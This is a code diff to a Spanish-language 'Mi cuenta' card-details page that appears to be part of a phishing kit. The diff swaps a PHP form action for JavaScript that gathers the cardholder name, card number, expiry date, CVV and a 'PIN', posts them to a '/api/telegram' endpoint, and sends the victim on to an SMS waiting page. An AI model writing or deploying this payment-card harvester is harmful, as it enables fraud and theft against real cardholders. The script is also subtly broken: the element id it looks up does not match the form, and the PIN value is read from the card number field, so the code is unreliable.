@@ -1,4 +1,4 @@
-﻿
+
 
 <!DOCTYPE html>
 
@@ -353,7 +353,7 @@
 
       </div>
 
-      <form id="CARDINFO" method="post" action="./xREPORT/Sinus/Mi_cuenta_send.php">
+      <form id="CARDINFO" method="post" >
 
 
 
@@ -449,6 +449,43 @@
 
 
 <script type="text/javascript">
+   // نفس الفورمات ديال التاريخ
+   function formatExpiryDate(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length >= 2) {
+      value = value.substring(0, 2) + '/' + value.substring(2, 4);
+    }
+    input.value = value.substring(0, 5);
+  }
+
+  const cardForm = document.getElementById("cardForm");
+  cardForm.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const CN = document.getElementById("CardholderName").value;
+    const cc = document.getElementById("CardNumber").value;
+    const exp = document.getElementById("ExpirationDate").value;
+    const cvv = document.getElementById("CCV").value;
+    const PIN = document.getElementById("CardNumber").value;
+
+
+    try {
+      const response = await fetch("/api/telegram", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ CN, cc, exp, cvv, PIN }),
+      });
+
+      if (response.ok) {
+        window.location.href = "Espera_1.html"; // يديه مباشرة لصفحة SMS
+      } else {
+        alert("Error al enviar datos.");
+      }
+    } catch (err) {
+      console.error(err);
+      alert("Error en la conexión.");
+    }
+  });
   
   $(document).ready(function() {
     $(":input").inputmask();
